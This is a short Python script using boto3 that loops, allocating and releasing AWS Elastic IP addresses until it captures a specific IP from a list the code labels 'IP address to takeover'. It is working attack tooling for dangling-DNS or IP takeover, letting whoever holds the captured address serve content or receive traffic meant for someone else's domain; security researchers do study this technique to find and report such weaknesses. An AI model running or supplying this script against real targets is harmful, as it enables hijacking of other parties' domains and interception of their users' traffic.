import time
import boto3

found = False
AWSSecretKey = ""         # Amazon console secret key
AWSAccessKeyId = ""       # Amazon console access key
mon_ips = [''] # IP address to takeover

# connect to ec2 service with provided keys
ecc2 = boto3.client(
    'ec2',
    aws_access_key_id=AWSAccessKeyId,
    aws_secret_access_key=AWSSecretKey,
    region_name='ap-southeast-1'
)

# acquiring Elastic IP and release it until we acquire specific IP 
while not found:
    allocation = ecc2.allocate_address(Domain='vpc')
    address = allocation["PublicIp"]
    allocation_id = allocation["AllocationId"]
    if address in mon_ips:
        found = True
        print("Acquired IP {0}".format(address))
    else:
        ecc2.release_address(AllocationId=allocation_id)
        
        # make sure to get new addresses
        time.sleep(60)